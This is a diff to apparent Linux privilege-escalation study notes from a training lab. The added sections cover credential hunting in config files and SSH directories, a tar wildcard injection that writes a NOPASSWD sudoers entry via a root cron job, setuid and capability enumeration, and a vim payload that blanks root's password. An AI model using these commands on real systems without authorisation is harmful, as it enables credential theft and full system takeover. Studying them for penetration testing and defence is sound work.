@@ -87,3 +87,79 @@ find scripts
 ```bash
 find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
 ```
+
+## Credential Hunting
+
+```bash
+cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'
+
+find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
+
+ls ~/.ssh
+
+find / -type f -name "wp-config.php" -exec grep -H "DB_USER\|DB_PASSWORD" {} \; 2>/dev/null
+```
+
+## TAR abuse 
+
+for example in tar command if we have a wild card used as root, or in a cron job example 
+
+```bash
+#
+#
+mh dom mon dow command
+*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
+```
+
+if we write this 
+
+```bash
+htb-student@NIX02:~$ echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
+htb-student@NIX02:~$ echo "" > "--checkpoint-action=exec=sh root.sh"
+htb-student@NIX02:~$ echo "" > --checkpoint=1
+```
+
+ --checkpoint=1 and --checkpoint-action=exec=sh root.sh is passed to tar as command-line options and the script if executed
+
+ ## Special Permissions
+
+ The Set User ID upon Execution (setuid) permission can allow a user to execute a program or script with the permissions of another user, typically with elevated privileges. The setuid bit appears as an s.
+
+ ```bash
+ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
+
+```
+
+The Set-Group-ID (setgid) permission is another special permission that allows us to run binaries as if we were part of the group that created them. These files can be enumerated using the following command
+
+```bash
+find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
+```
+
+find capabilities :
+
+```bash
+find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
+```
+
+payload for vim capabilities for cap_dac_override+eip
+
+```bash
+echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
+```
+
+## CronJobs
+
+Cron jobs can also be set to run one time (such as on boot). They are typically used for administrative tasks such as running backups, cleaning up directories, etc. The crontab command can create a cron file, which will be run by the cron daemon on the schedule specified. When created, the cron file will be created in /var/spool/cron for the specific user that creates it. Each entry in the crontab file requires six items in the following order: minutes, hours, days, months, weeks, commands. For example, the entry 0 */12 * * * /home/admin/backup.sh would run every 12 hours.
+
+We can confirm that a cron job is running using pspy, a command-line tool used to view running processes without the need for root privileges. We can use it to see commands run by other users, cron jobs, etc. It works by scanning procfs.
+
+find writable files 
+
+```bash
+find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
+```
+
+## LXC
+
+LXC  or linux container is an operating system-level virtualization technique that allows multiple Linux systems to run in isolation from each other on a single host by owning their own processes but sharing the host system kernel for them. 
